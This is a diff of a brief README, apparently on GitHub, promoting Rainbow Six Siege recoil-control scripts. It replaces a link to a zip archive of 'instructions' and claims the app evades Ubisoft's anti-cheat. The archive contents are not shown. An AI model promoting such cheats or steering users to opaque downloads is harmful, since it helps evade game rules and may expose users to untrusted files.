@@ -1,7 +1,8 @@
 Rainbow Six Siege Recoil Scripts By Zefus
 _____________________________________________
 Make sure you click on the README.md for clearer Instructions
-[README.md Instructions on how to operate.zip](https://github.com/user-attachments/files/20576515/Instructions.on.how.to.operate.zip)
+[Instructions on how to operate (2).zip](https://github.com/user-attachments/files/20578322/Instructions.on.how.to.operate.2.zip)
+
 _____________________________________________
 I have also instructed a video that i Recommend you watch it will show you how to download the recoil control app and also how to download and impliment the scripts for in game use but so far as of the time this post has been made the current app is undetectable by ubisoft and isnt currently bannable.
 _____________________________________________
